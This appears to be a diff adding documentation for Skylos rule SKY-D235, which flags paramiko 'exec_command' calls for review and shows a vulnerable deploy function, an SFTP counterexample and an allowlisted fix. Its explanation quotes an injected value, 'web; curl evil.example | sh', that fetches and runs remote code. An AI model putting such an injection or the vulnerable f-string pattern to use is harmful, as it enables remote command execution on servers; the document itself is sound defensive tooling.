@@ -1,0 +1,137 @@
+id: SKY-D235
+title: Remote command execution over SSH
+family: security
+severity: HIGH
+languages: [Python]
+gate:
+  full: counted
+cwe: [CWE-78]
+
+what_it_is: >-
+  `exec_command()` on an SSH client such as paramiko's `SSHClient` runs a
+  command string through the login shell of another machine. SKY-D235 marks
+  every such call for review, whatever its argument, because the command
+  runs with the remote account's rights.
+
+why_it_matters: >-
+  Deploy and admin scripts often hold SSH keys for production servers. If
+  any part of the command string can be influenced, for example a service
+  name typed into a chat bot, `web; curl evil.example | sh` runs on every
+  server the script reaches.
+
+flagged_example:
+  language: python
+  filename: ops/deploy.py
+  expect_line: 8
+  code: |
+    import paramiko
+
+
+    def restart_service(host, service):
+        client = paramiko.SSHClient()
+        client.load_system_host_keys()
+        client.connect(host, username="deploy")
+        _, stdout, _ = client.exec_command(f"sudo systemctl restart {service}")
+        status = stdout.channel.recv_exit_status()
+        client.close()
+        return status
+
+not_flagged_example:
+  language: python
+  filename: ops/deploy.py
+  code: |
+    import paramiko
+
+
+    def fetch_log(host, local_path):
+        client = paramiko.SSHClient()
+        client.load_system_host_keys()
+        client.connect(host, username="deploy")
+        sftp = client.open_sftp()
+        sftp.get("/var/log/app/app.log", local_path)
+        sftp.close()
+        client.close()
+  why: >-
+    The same SSH connection is used, but only to copy a file over SFTP. No
+    command string is sent to a remote shell, so there is nothing for this
+    rule to review.
+
+how_skylos_decides:
+  - >-
+    Resolves each call's name through imports and earlier assignments, so
+    `client = paramiko.SSHClient()` followed by `client.exec_command(...)`
+    becomes `paramiko.SSHClient.exec_command`.
+  - >-
+    Reports HIGH for every call whose name ends in `.exec_command`, on any
+    receiver, with a fixed or a built command alike. The rule is a review
+    marker for remote command execution, not a taint check.
+  - >-
+    The taint check for the same call is SKY-D212: it reports CRITICAL when
+    request data, `input()` or a function parameter reaches the command
+    string.
+
+source_refs:
+  - path: skylos/rules/danger/calls.py
+    symbol: "\".exec_command\": ("
+  - path: skylos/rules/danger/calls.py
+    symbol: "def _matches_rule(name, rule_key):"
+    note: a key that starts with `.` matches any name that ends with it.
+  - path: skylos/rules/danger/calls.py
+    symbol: "def _qualified_name_from_call("
+
+fix:
+  explanation: >-
+    Run only commands from a fixed list, check every value against an
+    allowlist, and quote the command with `shlex.join()`. The call is still
+    reported, because the rule marks every remote command, so record the
+    review on the line once it is safe.
+  filename: ops/deploy.py
+  code: |
+    import shlex
+
+    import paramiko
+
+    SERVICES = {"web", "worker"}
+
+
+    def restart_service(host, service):
+        if service not in SERVICES:
+            raise ValueError(f"unknown service: {service}")
+        client = paramiko.SSHClient()
+        client.load_system_host_keys()
+        client.connect(host, username="deploy")
+        cmd = shlex.join(["sudo", "systemctl", "restart", service])
+        _, out, _ = client.exec_command(cmd)  # skylos: ignore[SKY-D235] allowlisted
+        status = out.channel.recv_exit_status()
+        client.close()
+        return status
+
+false_alarms_and_suppression:
+  misfires:
+    - >-
+      A fixed command such as `client.exec_command("uptime")` is reported
+      too: the rule does not look at the argument.
+    - >-
+      Any method named `exec_command` on a non-SSH object, such as a
+      project's own job runner, is reported.
+    - >-
+      The same line often also gets SKY-D212 when a parameter or request
+      value reaches the command. That is a separate finding.
+  suppress:
+    - check: inline
+      text: >-
+        Mark a reviewed call on its own line and say why it is safe. A bare
+        `# noqa` does not hide HIGH security findings.
+      language: python
+      code: |
+        _, out, _ = client.exec_command("uptime")  # skylos: ignore[SKY-D235] fixed command
+    - check: baseline
+      text: >-
+        Accept the findings you already have with `skylos baseline .`, then
+        scan with `--baseline` so only new ones are listed.
+    - check: config
+      text: >-
+        `[tool.skylos] ignore = ["SKY-D235"]` turns the rule off for the
+        whole project. SKY-D212 still reports tainted commands.
+
+related: [SKY-D212, SKY-D203, SKY-D209, SKY-D200]
